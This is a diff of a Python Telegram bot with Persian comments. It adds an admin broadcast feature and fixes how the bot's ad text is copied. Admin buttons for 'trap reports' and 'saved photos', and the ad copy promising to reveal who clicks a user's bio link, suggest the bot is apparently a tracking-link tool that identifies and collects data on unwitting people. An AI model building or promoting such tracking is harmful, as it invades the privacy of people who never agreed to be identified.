@@ -550,7 +550,7 @@ def ad_buttons(call):
     
     bot.answer_callback_query(call.id, "✅")
 
-# ========== پنل مدیریت (با دکمه تبلیغات) ==========
+# ========== پنل مدیریت (با دکمه‌های جدید) ==========
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
     user_id = message.from_user.id
@@ -565,6 +565,7 @@ def admin_panel(message):
         InlineKeyboardButton("📋 گزارش‌های تله", callback_data="admin_reports"),
         InlineKeyboardButton("🖼 عکس‌های ذخیره شده", callback_data="admin_photos"),
         InlineKeyboardButton("📢 تبلیغات", callback_data="admin_advertise"),
+        InlineKeyboardButton("📢 ارسال به همه کاربران", callback_data="admin_broadcast"),  # دکمه جدید
         InlineKeyboardButton("🗑 پاک کردن دیتابیس", callback_data="admin_clear"),
         InlineKeyboardButton("🔙 بستن پنل", callback_data="admin_close")
     )
@@ -579,6 +580,82 @@ def admin_panel(message):
     )
     
     bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
+
+# ========== هندلر ارسال همگانی (Broadcast) ==========
+@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
+def admin_broadcast(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    
+    bot.answer_callback_query(call.id, "📝 لطفاً متن پیام خود را ارسال کنید.")
+    msg = bot.send_message(user_id, "📤 **ارسال به همه کاربران**\n\nلطفاً متن پیامی که می‌خواهید برای **همه کاربران** ارسال شود را وارد کنید.\n\n⚠️ می‌توانید از **مارک‌داون** و **لینک** استفاده کنید.\n\nبرای لغو، /cancel را بفرستید.", parse_mode='Markdown')
+    bot.register_next_step_handler_by_chat_id(user_id, broadcast_get_message, user_id, msg.message_id)
+
+def broadcast_get_message(message, admin_id, prompt_msg_id):
+    user_id = message.from_user.id
+    if user_id not in ADMIN_IDS:
+        return
+    
+    if message.text == "/cancel":
+        bot.send_message(user_id, "❌ عملیات ارسال همگانی لغو شد.")
+        try:
+            bot.delete_message(user_id, prompt_msg_id)
+        except:
+            pass
+        admin_panel(message)  # برگشت به پنل ادمین
+        return
+    
+    # دریافت متن پیام
+    broadcast_text = message.text
+    
+    # حذف پیام راهنما
+    try:
+        bot.delete_message(user_id, prompt_msg_id)
+    except:
+        pass
+    
+    # دریافت لیست همه کاربران
+    c.execute("SELECT telegram_id FROM users")
+    users = c.fetchall()
+    total = len(users)
+    
+    if total == 0:
+        bot.send_message(user_id, "📭 هیچ کاربری در دیتابیس وجود ندارد!")
+        admin_panel(message)
+        return
+    
+    bot.send_message(user_id, f"⏳ در حال ارسال پیام به {total} کاربر... لطفاً صبر کنید.")
+    
+    success = 0
+    failed = 0
+    
+    for idx, (uid,) in enumerate(users, 1):
+        try:
+            bot.send_message(uid, broadcast_text, parse_mode='Markdown')
+            success += 1
+        except Exception as e:
+            failed += 1
+            print(f"Failed to send to {uid}: {e}")
+        
+        # تاخیر ۰.۵ ثانیه برای جلوگیری از محدودیت
+        if idx % 30 == 0:
+            time.sleep(0.5)
+    
+    # گزارش نهایی
+    report = (
+        "✅ **ارسال همگانی کامل شد!**\n\n"
+        f"👤 کل کاربران: {total}\n"
+        f"✅ ارسال موفق: {success}\n"
+        f"❌ ارسال ناموفق: {failed}"
+    )
+    bot.send_message(user_id, report, parse_mode='Markdown')
+    
+    # برگشت به پنل ادمین
+    admin_panel(message)
+
+# ========== تبلیغات (رفع مشکل کپی) ==========
 @bot.callback_query_handler(func=lambda call: call.data == "admin_advertise")
 def admin_advertise(call):
     user_id = call.from_user.id
@@ -586,15 +663,13 @@ def admin_advertise(call):
         bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
         return
     
-    # حذف پیام قبلی (با try/except برای جلوگیری از خطا)
     try:
         bot.delete_message(call.message.chat.id, call.message.message_id)
     except Exception as e:
-        print(f"Error deleting message: {e}")  # لاگ خطا در کنسول
+        print(f"Error deleting message: {e}")
     
     ad_link = f"https://t.me/{BOT_USERNAME}?start=ad"
     
-    # متن کامل برای کپی (با هایپرلینک آبی رنگ)
     full_ad_text = (
         "👀 **کی داره پروفایلت رو چک میکنه؟** 😂\n\n"
         "تا حالا شده شک کنی کسی داره پروفایلت رو می‌بینه؟\n"
@@ -608,7 +683,6 @@ def admin_advertise(call):
         "💪 **همین حالا امتحان کن، ضرر نداره!**"
     )
     
-    # دکمه‌های ادمین
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
         InlineKeyboardButton("💬 پیام ناشناس", url=ad_link),
@@ -617,11 +691,10 @@ def admin_advertise(call):
         InlineKeyboardButton("🖼 عکس پروفایل", url=ad_link)
     )
     keyboard.add(
-        InlineKeyboardButton("📋 کپی متن + لینک", callback_data=f"copy_ad_full_{full_ad_text}"),
+        InlineKeyboardButton("📋 کپی متن + لینک", callback_data="copy_ad"),  # <-- کوتاه شد
         InlineKeyboardButton("🔙 بازگشت به پنل", callback_data="back_to_panel")
     )
     
-    # پیامی که ادمین می‌بینه
     ad_text = (
         "📢 **متن تبلیغاتی ربات**\n\n"
         "📋 **متن زیر رو کپی کن و برای کاربران بفرست:**\n\n"
@@ -634,14 +707,35 @@ def admin_advertise(call):
     bot.send_message(user_id, ad_text, reply_markup=keyboard, parse_mode='Markdown')
     bot.answer_callback_query(call.id, "✅ متن تبلیغاتی ساخته شد!")
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_ad_full_"))
-def copy_ad_full(call):
-    full_text = call.data.replace("copy_ad_full_", "")
-    bot.answer_callback_query(
-        call.id, 
-        f"✅ متن و لینک کپی شد!\n\n{full_text[:200]}...", 
-        show_alert=True
+@bot.callback_query_handler(func=lambda call: call.data == "copy_ad")
+def copy_ad_callback(call):
+    user_id = call.from_user.id
+    if user_id not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ شما دسترسی ندارید!", show_alert=True)
+        return
+    
+    ad_link = f"https://t.me/{BOT_USERNAME}?start=ad"
+    full_text = (
+        "👀 **کی داره پروفایلت رو چک میکنه؟** 😂\n\n"
+        "تا حالا شده شک کنی کسی داره پروفایلت رو می‌بینه؟\n"
+        "با این ربات دیگه نیازی به حدس زدن نیست!\n\n"
+        "🔥 **فقط کافیه روی لینک زیر کلیک کنی:**\n"
+        f"[همین حالا امتحان کن!]({ad_link})\n\n"
+        "🔹 **چیکار میکنه؟**\n"
+        "• یه لینک اختصاصی بهت میده\n"
+        "• لینک رو میذاری تو بیوگرافیت\n"
+        "• هرکی کلیک کنه، می‌فهمی کی بوده! 😉\n\n"
+        "💪 **همین حالا امتحان کن، ضرر نداره!**"
     )
+    
+    bot.send_message(
+        user_id,
+        f"📋 **متن کامل تبلیغاتی (قابل کپی):**\n\n"
+        f"`{full_text}`\n\n"
+        "📌 این متن را انتخاب کنید و کپی کنید.",
+        parse_mode='Markdown'
+    )
+    bot.answer_callback_query(call.id, "✅ متن کامل برای شما ارسال شد!")
 
 # ---------- بقیه بخش‌های پنل مدیریت (بدون تغییر) ----------
 @bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
